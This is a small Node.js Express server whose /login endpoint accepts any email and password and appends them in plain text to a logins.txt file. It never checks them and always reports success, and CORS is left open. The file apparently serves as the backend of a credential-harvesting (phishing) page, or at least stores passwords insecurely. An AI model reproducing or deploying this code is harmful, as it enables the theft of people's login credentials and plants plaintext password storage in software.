const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const cors = require('cors');


const app = express();
const PORT = 3000;

app.use(cors()); 
app.use(bodyParser.json());

app.post('/login', (req, res) => {
    const { email, password } = req.body;

    if (email && password) {
        const logData = `Email: ${email}, Senha: ${password}\n`;
        fs.appendFile(path.join(__dirname, 'logins.txt'), logData, (err) => {
            if (err) {
                console.error('Failed to write to file:', err);
                return res.status(500).json({ success: false });
            }
            res.json({ success: true });
        });
    } else {
        res.status(400).json({ success: false });
    }
});

app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});